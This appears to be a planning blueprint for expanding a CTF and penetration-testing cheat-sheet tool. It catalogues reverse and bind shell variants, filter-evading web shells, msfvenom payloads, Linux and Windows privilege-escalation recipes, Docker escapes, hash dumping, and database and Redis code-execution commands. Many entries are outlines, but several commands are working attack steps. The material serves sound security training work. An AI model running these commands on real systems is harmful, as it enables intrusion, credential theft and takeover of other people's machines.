# Commando — Workstation Expansion Blueprint (v3, FINAL DRAFT)

> **Status: PLANNING — nothing is coded yet. This document is for review & sign-off.**
> Scope: 5 expansions of existing items + 2 new Cheat-sheet items. **No new categories, no new sections, no engine changes.**
> Excluded: Active Directory tools & techniques.
>
> **v3 rule (agreed):** nothing is hardcoded/assumed on the target. Wherever a name varies (DB names, table names, share names), the card is a *discovery sequence* (the fixed commands that always work) — the only hardcoded values are ones that are **fixed permanently by the software itself** (e.g. `mysql.user`, `wp_users`, `xp_cmdshell` — these never change).

---

## Legend

- **[EXISTS]** — already in Commando today. Context only, will not be touched.
- **[NEW]** — what will be added.
- **[REMOVED from plan]** — was in blueprint v2, cut in v3 because it's rare in CTFs (listed in §6 so you can veto the cuts).
- **[⚠️ DECIDE]** — borderline; kept or cut per your call (§5). Not assumed either way.

---

## Change summary — BEFORE → AFTER

| Area | Today (Commando) | After v3 |
|---|---|---|
| Reverse Shell | 8 variants + 1 listener | **19 variants + 3 listeners** |
| Bind Shell | 1 variant | **5 variants** |
| Web Shells | 4 snippets | **11 snippets** |
| MSFVenom | 4 formats | **primer + 9 formats** |
| Linux Privesc | 15 snippets | **34 snippets** (incl. GTFOBins one-liners) |
| Windows Privesc | 11 snippets | **22 snippets** |
| Cheat-sheets | 4 items | **6 items** (+ Loot & Flag Hunting, + Miscellaneous) |
| Sidebar | 10 workstation items | **12 items** — Payloads & Privesc items unchanged, just deeper |

---

## 1. PAYLOADS

### 1.1 Reverse Shell — add variants

**[EXISTS]:** bash, bash(read-line), nc(mkfifo), python3, php, perl, powershell, socat + `nc -lvnp {LPORT}` listener.

**[NEW] variants (all `runnable: false` — they run on the victim, Copy-only):**

| Variant | Command shape | Why / when |
|---|---|---|
| `PowerShell (base64)` | `powershell -nop -enc <base64>` | The long one-liner breaks on quoting through web inputs; encoded form always survives. Explain walks through generating the base64 on your box. |
| `PowerShell (short)` | Compact TCP-client form | Tight character limits at injection points. |
| `Python (short)` | Minimal socket+dup2 one-liner, no `pty.spawn` | Restricted pythons / char limits. |
| `Ruby` | `ruby -rsocket -e ...` | Rails / dev boxes. |
| `Node.js` | `node -e` net-socket + child_process | Node/Express web challenges. |
| `Java` | Runtime.exec TCP shell class body | Tomcat / Java boxes. Copy-only (saved to a file). |
| `Awk` | `awk 'BEGIN{s="/inet/tcp/0/{LHOST}/{LPORT}"...}'` | The "only awk exists" situation. **[⚠️ DECIDE — borderline rare]** |
| `socat (encrypted)` | `socat OPENSSL:{LHOST}:{LPORT},... EXEC:'bash -li',pty,...` | Plain TCP monitored/blocked. Ships with its own matching `listener` (generate self-signed cert + `socat OPENSSL-LISTEN:{LPORT}`), `newTab: true`. |
| `Base64-wrapped bash` | `echo <b64> \| base64 -d \| bash` | Bypasses filters blocking `>&` or `/dev/tcp` strings. |
| `URL-encoded` | Bash shell fully percent-encoded | Paste straight into URL params / GET injection. |
| `Spaceless ($IFS)` | `bash${IFS}-i${IFS}>&...` | Injection points that strip spaces. |

**[REMOVED from plan]:** Telnet shell (ancient), Lua shell (very rare).

**[NEW] listeners (extra cards):**
- `rlwrap nc -lvnp {LPORT}` — instant arrow-key history; skips TTY gymnastics. `newTab: true`.
- `socat file:$(tty),raw,echo=0 tcp-listen:{LPORT}` — full interactive PTY immediately. `newTab: true`.

### 1.2 Bind Shell — add variants

**[EXISTS]:** basic nc bind + "connect with nc" listener.

**[NEW] variants:**
- **Bash bind** — `bash -c 'while true; ... /dev/tcp'` loop form.
- **Python bind** — socket listen + dup2 shell.
- **socat bind (full TTY)** — `socat TCP-LISTEN:{LPORT},... EXEC:'bash -li',pty,...` — connect and get a real terminal instantly.
- **nc -e** — `nc -lvnp {LPORT} -e /bin/sh` — boxes with "traditional" netcat.

**[REMOVED from plan]:** PowerShell bind (bind shells are already rare; PowerShell bind nearly never appears).

### 1.3 Web Shells — add snippets

**[EXISTS]:** PHP one-liner, PHP base64-eval, JSP, ASPX.

**[NEW] snippets (all `runnable: false` — pasted onto the target):**
- **PHP (full featured)** — self-contained: command output rendered in-page + file upload form. Explain: "save as shell.php → upload → visit ?cmd=whoami".
- **PHP (obfuscated)** — `<?php $_GET[1]($_GET[2]); ?>` — defeats naive regex upload filters.
- **PHP (polyglot/GIF89a)** — magic bytes prepended so it passes `getimagesize()` / image-MIME checks.
- **JSPX** — many Tomcat boxes prefer JSPX over JSP.
- **Node.js** — `child_process.execSync(req.query.cmd)` style for Node targets.
- **.htaccess trick** — `AddType application/x-httpd-php .png` — upload it, then any uploaded .png runs as PHP.
- **Upload extension reference** — non-runnable card; explain lists bypass extensions: `.php5 .phtml .phps .phar .pht .php.jpg .php%00.jpg`.


### 1.4 MSFVenom — staged/stageless primer + new formats

**[EXISTS]:** Linux ELF, Windows EXE, PHP, WAR — each with a matching handler.

**[NEW] Part A — staged vs stageless primer (reference cards at the top of the item):**
- **"Stagedless — `shell_reverse_tcp`"** — the full shell in one executable; one connection, more reliable. Explain: "prefer this in CTFs".
- **"Staged — `shell/reverse_tcp`"** — small stager downloads the rest; the handler payload name must match *exactly*. Explain: smaller drops, but mismatched handlers are the #1 beginner msfvenom mistake.
- One snippet showing the same payload both ways side by side, so the difference (`_` vs `/`) is impossible to miss.

**[NEW] Part B — new format variants (each with its own matching per-variant handler, same pattern as the existing four):**

| Variant | Command shape | Use case |
|---|---|---|
| `Windows .ps1` | `windows/x64/shell_reverse_tcp -f psh` | Exe upload blocked but scripts pass. |
| `Windows .msi` | `windows/x64/shell_reverse_tcp -f msi` | Pairs with AlwaysInstallElevated privesc (§2.2). |
| `Windows .dll` | `windows/x64/shell_reverse_tcp -f dll` | DLL-hijacking delivery (§2.2). |
| `Linux .sh` | `cmd/unix/reverse_bash -f raw` | No compile needed on target. |
| `Meterpreter (Windows)` | `windows/x64/meterpreter_reverse_tcp -f exe` | When you want post modules; explain mentions `PrependMigrate=true`. |

**[REMOVED from plan]:** Windows `.hta`, Linux `.so`, Linux Meterpreter (rare formats in CTFs).

---

## 2. PRIVILEGE ESCALATION

### 2.1 Linux Privesc — add snippets

**[EXISTS]:** id/whoami, sudo -l, SUID/SGID find, capabilities, cron, world-writable, kernel, root processes, ports, history, env, passwd, linpeas download+run (wget & curl).

**[NEW] — Group 1: group-membership quick wins (right after `sudo -l`):**

| Snippet | Explain line |
|---|---|
| **Groups check** (`id`) | "Look for: sudo, docker, lxd, disk — each one is a known privesc path." |
| **Docker escape** | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` — in the docker group = root. |
| **LXD escape** | Reference steps (import alpine image, `lxc init`, `lxc exec`) as a copy-only card. |
| **Disk group** | `debugfs /dev/sda1` → read `/etc/shadow` directly. |

**[REMOVED from plan]:** ADM group (log reading, rarely the intended path).

**[NEW] — Group 2: GTFOBins / sudo -l abuse one-liners** *(re-added in v3 — the #1 most common Linux CTF privesc)*:
Ready one-liners for the entries that show up in `sudo -l` most often. Each card = the exact command; explain = which sudo -l entry it matches:
`sudo vi/vim`, `sudo find`, `sudo awk`, `sudo less`, `sudo more`, `sudo man`, `sudo nmap`, `sudo python3`, `sudo perl`, `sudo ruby`, `sudo env`, `sudo cp` (overwrite /etc/passwd or shadow via temp copy), `sudo tar`, `sudo zip`, `sudo bash/sh`, `sudo ssh`. Plus a **"check GTFOBins first"** reference card linking the site.

**[NEW] — Group 3: deeper enumeration:**
- **PATH hijacking check** — `echo $PATH` + writable-dir find; explain: "if a root cron/script calls a binary by name, plant yours earlier in PATH".
- **LD_PRELOAD via sudo** — when `sudo -l` shows `env_keep+=LD_PRELOAD` → the compile-and-drop workflow (copy-only).
- **Cron wildcard injection** — the classic `tar *` checkpoint exploit, explain-rich.
- **Writable /etc/passwd** — check with `ls -la` → generate an openssl password hash → append a root user line (copy-only).
- **NFS no_root_squash** — `cat /etc/exports` → mount + SUID workflow.
- **Container check** — `ls /.dockerenv; cat /proc/1/cgroup` → "if in a container, see Miscellaneous → Docker".
- **Credential hunting** — `grep -ri password /home /etc /var 2>/dev/null | head`, find `.env`/`.pem`/`authorized_keys`, all users' history files.
- **SUID deep-dive** — GTFOBins cross-check hint + `strings` on unknown/custom SUID binaries (custom SUID = the intended path in many CTFs).
- **Root services with creds** — `ps aux | grep -E 'mysql|postgres'` → try socket login as root (links to Miscellaneous → Databases).

**[NEW] — Group 4: kernel exploit quick-checks (reference cards, `runnable: false`, vulnerable version ranges in explain):**
- **PwnKit** (CVE-2021-4034, polkit) — most reliable on old Ubuntu/Debian CTF images.
- **DirtyPipe** (CVE-2022-0847).
- **Sudo Baron Samedit** (CVE-2021-3156).
- **DirtyCow** (CVE-2016-5195) — legacy boxes.

**[REMOVED from plan]:** OverlayFS CVE-2021-3493 (real but rarely the intended path).


### 2.2 Windows Privesc — add snippets

**[EXISTS]:** whoami /all, systeminfo (+filter), net user, unquoted service paths (find only), whoami /priv, netstat, schtasks, cmdkey /list, winPEAS download+run (certutil & PowerShell).

**[NEW] — Group 1: privilege quick wins (right after `whoami /all`):**

| Snippet | Explain |
|---|---|
| **AlwaysInstallElevated check** | Two `reg query` commands; if both = 1 → install the MSFVenom `.msi` payload (§1.4) as SYSTEM. |
| **SeImpersonate → Potato** | Detect via `whoami /priv`, then JuicyPotato / PrintSpoofer / GodPotato download+run via `{FILE}` tokens — *the* most common Windows CTF privesc. Explain covers which Potato for which OS build. |
| **SeBackupPrivilege** | robocopy /b to copy SAM+SYSTEM → dump hashes (pairs with the SAM dump recipe in §3.1 Loot). |

**[REMOVED from plan]:** SeTakeOwnershipPrivilege (rare in CTFs), token impersonation/incognito (internal-pentest thing, not CTF).

**[NEW] — Group 2: service abuse & enumeration:**
- **Service binPath hijack** — `sc qc <svc>` to enumerate → `sc config <svc> binpath=` → point at your payload → `sc start`.
- **Unquoted service path weaponization** — the existing item only *finds* them; this adds the plant-a-binary-in-the-gap steps.
- **Service DLL hijacking** — find writable service directories, plant the DLL, restart the service. (The writable-PATH check is folded into this card's explain — no standalone card.)
- **Registry autoruns** — `reg query` on Run keys (HKLM + HKCU) → writable entries = payload placement.
- **Credential file hunt** — `unattend.xml`, `sysprep.inf`, `web.config`, `php.ini`: `dir /s *.xml *.ini *.config` + `findstr /si password *.xml *.ini *.txt`.
- **runas /savecred** — pairs with the existing `cmdkey /list` card: the actual `runas /savecred /user:... cmd.exe` usage.
- **WiFi saved creds** — `netsh wlan show profile name=... key=clear`.
- **Installed software audit** — `wmic product get name,version` → "google every version" — the classic old-software-CVE path.

**[NEW] — Group 3: hash dumping (non-AD)** — the standard Windows CTF ending:
- **Registry save** — `reg save HKLM\SAM sam.bak` + `reg save HKLM\System system.bak` (needs admin/SYSTEM).
- **Offline dump** — `impacket-secretsdump -sam sam.bak -system system.bak LOCAL` on your box → NTLM hashes.
- **Crack** — cross-link: NTLM = hashcat mode 1000 / john `nt` format.

---

## 3. CHEAT-SHEETS

### 3.1 NEW item: "Loot & Flag Hunting" — {FILE}-driven

**Purpose:** the panel you keep open the moment you land a shell. **The {FILE} token is the heart of it:** you type what you're hunting in the Context bar (`flag`, `user.txt`, `secret`, `.pem`, `password` — anything) and every search card re-targets instantly. `{FILE}` already exists as a session key (used today for linpeas/winPEAS downloads) — zero engine changes.

**[NEW] — {FILE}-driven search cards:**
- **Search by name** — `find / -iname '*{FILE}*' 2>/dev/null` — explain: "set FILE to what you're hunting (flag, user.txt, secret) in the Context bar".
- **Exact name match** — `find / -name '{FILE}' -type f 2>/dev/null`.
- **Search with details** — `find / -iname '*{FILE}*' -exec ls -la {} \; 2>/dev/null` — found files with size/owner/perms.
- **Search inside file contents** — `grep -rn '{FILE}' / 2>/dev/null | head -n 50` — set FILE to `flag{`, `password`, a keyword — greps file *contents*, not names.
- **Fast version, common dirs** — `find /home /root /var/www /tmp /opt -iname '*{FILE}*' 2>/dev/null` — same idea without scanning the whole disk.
- **Recently modified** — `find / -mmin -60 2>/dev/null` — catches what the box builder touched last (fixed, no token).

**[NEW] — credential & config loot:**
- **Config loot pack** — find/grep combo for `.env`, `wp-config.php`, `settings.py`, `database.yml`, `config.php` — where DB passwords always live.
- **SSH keys** — find `id_rsa` / `id_ed25519` / `authorized_keys` across all home dirs.
- **All users' history** — `for u in /home/*; do cat $u/.bash_history; done; cat /root/.bash_history` (if readable).
- **Browser saved passwords location card** — reference for both Linux & Windows paths.
- **Environment & memory secrets** — `env`, `cat /proc/*/environ 2>/dev/null | tr '\0' '\n'` — cloud keys and DB URLs leak here.

**[NEW] — hash-cracking flows (the classic CTF endings):**
- **Linux /etc/shadow** — `unshadow passwd shadow > hashes` (grab both files first) → `john hashes` / `hashcat -m 1800` — explain notes which `$id$` = which mode.
- **Windows SAM** — pairs with §2.2 Group 3: the `impacket-secretsdump` output → `hashcat -m 1000` step.
- **SSH key with passphrase** — `ssh2john id_rsa > hash` → `john hash` — very common when a looted key won't connect.

**[NEW] — archives (flag inside a locked zip — happens in nearly every CTF):**
- **List & extract** — `unzip -l`, `7z l` / `7z x` — always look before brute-forcing.
- **Crack zip** — `zip2john <file> > hash` → `john hash`; `fcrackzip -u -D -p rockyou.txt <file>` as alternative.
- **Crack rar/7z** — `rar2john` / `7z2john` reference card.

**[NEW] — source & version-control loot:**
- **Git repos** — find `.git` dirs → `git log -p`, `git stash list`, `git diff` — deleted-flag-in-history hint.
- **Backup files** — `find / -name '*.bak' -o -name '*.old' -o -name '*~' 2>/dev/null`.

**[NEW] — credential reuse (the card people forget):**
- "Always try found creds on: `su <user>`, SSH, MySQL, SMB, web logins" — copy-only reference card.


### 3.2 NEW item: "Miscellaneous"

**Purpose:** the "scenario cards" panel — commands that are **always used the same way** whenever a particular scenario appears. Label = the scenario, command = the fixed recipe, `explain` = when it applies. **Where a name varies per box (DB names, table names, share names), the card is the fixed discovery sequence — nothing assumed. The only hardcoded names are ones permanently fixed by the software itself** (`mysql.user`, `wp_users`, `xp_cmdshell`, `authorized_keys`).

**Databases — getting in:**
- **MySQL (remote)** — `mysql -h {RHOST} -u {USER} -p` — the standard way in with found creds.
- **MySQL (local socket)** — `mysql -u root` — no password needed when already root on the box.
- **PostgreSQL** — `psql -h {RHOST} -U {USER} <db>` (explain: DB name is usually discovered from the app config — link to §3.1 config loot).
- **MSSQL** — `sqsh -S {RHOST} -U {USER} -P '{PASS}'` (or `sqlcmd`) — non-AD usage.
- **SQLite** — `sqlite3 <file>` — files found via §3.1 `{FILE}` search.
- **MongoDB** — `mongosh --host {RHOST}`.

**Databases — extracting user credentials (the scenario you asked for):**
- **MySQL schema discovery** — the fixed sequence: `SHOW DATABASES;` → `USE <db>;` → `SHOW TABLES;` → `DESCRIBE <table>;` — never assume table names, walk them.
- **MySQL dump a table** — `SELECT * FROM <db>.<table>;` — explain: user tables are commonly named users/accounts/admin with columns username/password — *discover first, then select*.
- **MySQL internal users** — `SELECT user, authentication_string FROM mysql.user;` — permanently-fixed table name; often holds root's reuse-able hash.
- **WordPress** — `SELECT user_login, user_pass FROM wp_users;` — `wp_users` is fixed by WordPress core; extremely common CTF loot.
- **MongoDB users** — `use <db>` → `db.users.find()` — same discover-then-dump idea.
- **PostgreSQL RCE (as DB admin)** — `COPY (SELECT '') TO PROGRAM '<command>';` + `pg_read_file()` — the fixed privesc recipes once you're postgres admin.
- **MSSQL command execution** — `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` → `EXEC xp_cmdshell 'whoami';` — THE fixed MSSQL scenario, all names permanently fixed by MSSQL.
- **MySQL write a webshell** — `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';` — fixed recipe when running as DB root (explain: only works if `secure_file_priv` allows).

**SMB / file shares:**
- **List shares** — `smbclient -L //{RHOST} -N` (anonymous) and with creds.
- **Connect & browse** — `smbclient //{RHOST}/<share> -N` → `ls`, `get`, `put` — the fixed session commands.
- **Map all shares at once** — `smbmap -H {RHOST}` (+ with creds) — shows what's readable/writable.
- **Serve a share (your box)** — `impacket-smbserver share . -smb2support` (`newTab: true`) — Windows file transfer & exfil.
- **Copy from Windows** — `copy \\{LHOST}\share\{FILE}` — pairs with the card above; `{FILE}` = the tool/loot filename.
- **Enumerate** — `nmap --script smb-* -p 139,445 {RHOST}` quick reference.

**NFS:**
- **List exports** — `showmount -e {RHOST}` — always the first command.
- **Mount a share** — `mount -t nfs {RHOST}:<export> /tmp/mnt -o nolock`.
- **no_root_squash exploit** — mount → craft a SUID binary as root → execute on the target — the fixed CTF recipe (cross-link §2.1).

**FTP:**
- **Anonymous login** — `ftp {RHOST}` with `anonymous:anonymous` — always worth trying first.
- **wget mirror** — `wget -m ftp://anonymous@{RHOST}/` — grab everything without clicking.
- **Session commands** — `binary`, `passive`, `put` — the fixed upload recipe.

**Mail (SMTP / IMAP / POP3):**
- **SMTP connect** — `openssl s_client -connect {RHOST}:{RPORT} -quiet` — for relay/misconfig challenges.
- **IMAP session** — `openssl s_client -connect {RHOST}:993` → `a login {USER} {PASS}` → `a select inbox` → `a fetch 1:* (body[])` — the fixed IMAP recipe.
- **POP3 session** — `nc {RHOST} 110` → `USER {USER}` → `PASS {PASS}` → `LIST` → `RETR 1` — the fixed POP3 recipe.
- **Mail user enumeration** — `smtp-user-enum` / VRFY reference.

**[REMOVED from plan]:** swaks send-test card (relay/phish is rare in CTFs vs. reading mail).


**Docker:**
- **Recon** — `docker ps -a`, `docker images`, `docker inspect <id>` — the fixed triage once you're in the docker group or have the socket.
- **Group escape (root)** — `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` — cross-link §2.1.
- **Mounted socket escape** — when `/var/run/docker.sock` is reachable: `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh`.
- **Privileged container escape** — `fdisk -l` → `mkdir /tmp/host && mount /dev/sda1 /tmp/host` — the fixed privileged recipe.
- **Image grab** — `docker save <image> -o image.tar` — for looting secrets baked into images.

**Remote access:**
- **RDP** — `xfreerdp /u:{USER} /p:{PASS} /v:{RHOST} /dynamic-resolution` — the standard connect.
- **WinRM** — `evil-winrm -i {RHOST} -u {USER} -p '{PASS}'` — the standard shell when 5985 is open (non-AD usage).
- **VNC** — `vncviewer {RHOST}` — **[⚠️ DECIDE — moderate frequency; kept for now]**.
- **SSH basics** — `ssh {USER}@{RHOST} -i id_rsa` (+ `-t`, `-o StrictHostKeyChecking=no`, agent-forwarding warning in explain).

**Other recurring scenarios:**
- **Redis** — `redis-cli -h {RHOST}` → `INFO` → the two fixed RCE recipes: webshell via `CONFIG SET dir /var/www/html` + `SET` + `SAVE`, and SSH key via `CONFIG SET dir /root/.ssh` + authorized_keys (name fixed by SSH permanently) — the Redis attack everyone reuses.
- **SNMP** — `snmpwalk -v2c -c public {RHOST}` — when 161/udp is open, always this.
- **Rsync** — `rsync {RHOST}::` to list modules → `rsync -av {RHOST}::<module> <dir>` — anonymous rsync is a recurring loot path.
- **Fingerprint banner grab** — `nc {RHOST} {RPORT}` — the universal "what service is this" first move.

**[REMOVED from plan]:** memcached (rare), git-server clone (rare as a service — `.git` folder looting stays in §3.1 instead).

---

## 4. Sidebar impact

| Category | Today | After | Change |
|---|---|---|---|
| Payloads | 4 items | 4 items | same items, more variants/snippets — sidebar unchanged |
| Privilege Escalation | 2 items | 2 items | same items, more snippets — sidebar unchanged |
| Cheat-sheets | 4 items | **6 items** | + "Loot & Flag Hunting" + "Miscellaneous" |

- **No new categories, no layout changes.** The two new items slot into the existing Cheat-sheets group — the registry auto-renders them.
- Order inside Cheat-sheets: TTY Upgrade → File Transfer → Host Enumeration → **Loot & Flag Hunting** → Pivoting → **Miscellaneous** (loot right after enumeration, since that's when you use it; Miscellaneous last as the reference shelf).
- Sidebar grows by exactly **2 lines**. Both new items get keyword-rich summaries ("flags, loot, search, mysql, smb, nfs, ftp, imap, docker…" style) so typing any scenario finds them via the existing search.
- Long snippet lists stay plain cards in registry order, grouped by scenario via the label prefix (e.g. "Databases —", "SMB —") so no engine change is needed. *Optional nicety for later: a `group?: string` field on Snippet to render small headings — not required, not planned for this round.*

---

## 5. Open decisions (not assumed — your call before we implement)

| # | Item | Where | Keep or cut? |
|---|---|---|---|
| 1 | **Awk reverse shell** | §1.1 | Borderline rare — meme-classic but seldom needed. |
| 2 | **VNC connect card** | §3.2 Remote access | Moderate frequency on HTB-style boxes. |
| 3 | **Java reverse shell** | §1.1 | Kept (Tomcat boxes are common) — confirm you agree. |
| 4 | **GTFOBins full 16-card set** | §2.1 Group 2 | Could trim to the top ~10 if 16 feels heavy. |

---

## 6. Full removal log (v2 → v3, rare in CTFs)

1. Telnet reverse shell — ancient.
2. Lua reverse shell — very rare.
3. PowerShell bind shell — bind shells already rare.
4. ASP classic web shell — legacy IIS only.
5. MSFVenom Windows `.hta` — rare delivery in CTFs.
6. MSFVenom Linux `.so` — rare delivery.
7. MSFVenom Linux Meterpreter — rare in CTFs.
8. Linux Privesc: ADM group — log reading, rarely the path.
9. Linux Privesc: OverlayFS (CVE-2021-3493) — rarely intended.
10. Windows Privesc: SeTakeOwnershipPrivilege — rare in CTFs.
11. Windows Privesc: token impersonation/incognito — internal-pentest, not CTF.
12. Windows Privesc: standalone writable-PATH card — folded into DLL-hijacking explain.
13. Miscellaneous: memcached — rare.
14. Miscellaneous: git-server clone — rare (`.git` looting stays in §3.1).
15. Miscellaneous: swaks send-test mail — relay/phish rare in CTFs.

---

## 7. Implementation notes (when we code — not now)

- All content goes into the existing three files: `payloads.ts`, `privesc.ts`, `cheatsheets.ts` (the two new cheat-sheet items may get their own files `cheatsheets/loot.ts` + `cheatsheets/misc.ts` if the main file gets long — the `index.ts` registry makes that a two-line change).
- Rules as today: victim-side = `runnable: false`; listeners/servers = `newTab: true`; everything else runs in the active tab.
- Tokens reused everywhere: `{LHOST}`, `{LPORT}`, `{RHOST}`, `{RPORT}`, `{FILE}`, `{FILEPORT}`, `{USER}`, `{PASS}` — **no new session keys needed.** The `{FILE}` token already exists; Loot & Flag Hunting simply reuses it as the search term.
- **No type, engine, or component changes at all.** Everything in this blueprint is pure data.
- **No hardcoded assumptions:** every card either uses a session token, or is a fixed discovery sequence, or names something permanently fixed by the software itself.

---

*End of blueprint v3. Resolve the 4 open decisions in §5, veto any removal in §6, then implementation starts.*

**[REMOVED from plan]:** ASP classic (legacy IIS only, rare).
